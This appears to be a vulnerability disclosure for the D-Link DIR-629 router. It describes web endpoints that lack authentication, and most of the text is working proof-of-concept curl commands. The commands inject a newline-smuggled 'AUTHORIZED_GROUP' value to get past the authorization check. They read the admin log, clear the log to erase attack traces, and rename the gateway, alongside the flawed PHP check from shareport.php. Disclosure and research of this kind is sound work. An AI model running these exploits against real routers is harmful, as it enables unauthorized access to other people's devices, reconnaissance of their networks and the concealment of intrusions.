# DIR-629

### 0X01 
There are some web interfaces without authentication requirements in D-Link routers. An attacker can get the router’s log file and clear it ,which could be used to detect inside network structure and erase the attack traces.

POC

``` 
curl http://[ip]:[port]/log_get.php -d "aaa=%0aAUTHORIZED_GROUP=0"
```

Attackers can get the log files of Admin

![image-20191101091458421](https://github.com/Cyc1eC/D-Link/blob/master/DIR-629/image-20191101091458421.png) 

if attackers send the data:

``` 
curl http://[ip]:[port]/log_clear.php -d "aaa=%0aAUTHORIZED_GROUP=0"
```

it will clear the log.

### 0X02
The attacker can arbitrarily tamper with GWNAME.
code in shareport.php

```php
if ($AUTHORIZED_GROUP < 0)
{
	$result = "FAIL";
	$reason = i18n("Permission deny. The user is unauthorized.");
}
else
{
	if ($_POST["action"] == "sethostname")
	{
		$value = $_POST["value"];
		if ($value != "")
		{
			set("/device/gw_name", $value);
			event("SHAREPORT.SETGWNAME");
			$RESULT = "OK";
			$REASON = "";					
		}
	}	
	else	fail(i18n("Unknown ACTION!"));
}
```

Attackers can set aaa=%0aAUTHORIZED_GROUP=1 to bypass the user check，and set the action=sethostname,value=Cyc1e,then we can change the GWNAME to Cyc1e.

POC:

``` 
curl http://[ip]:[port]/shareport.php -d "aaa=%0aAUTHORIZED_GROUP=1&action=sethostname&value=Cyc1e"
```
![image-20191107215245404](https://github.com/Cyc1eC/D-Link/blob/master/DIR-629/image-20191107215245404.png)
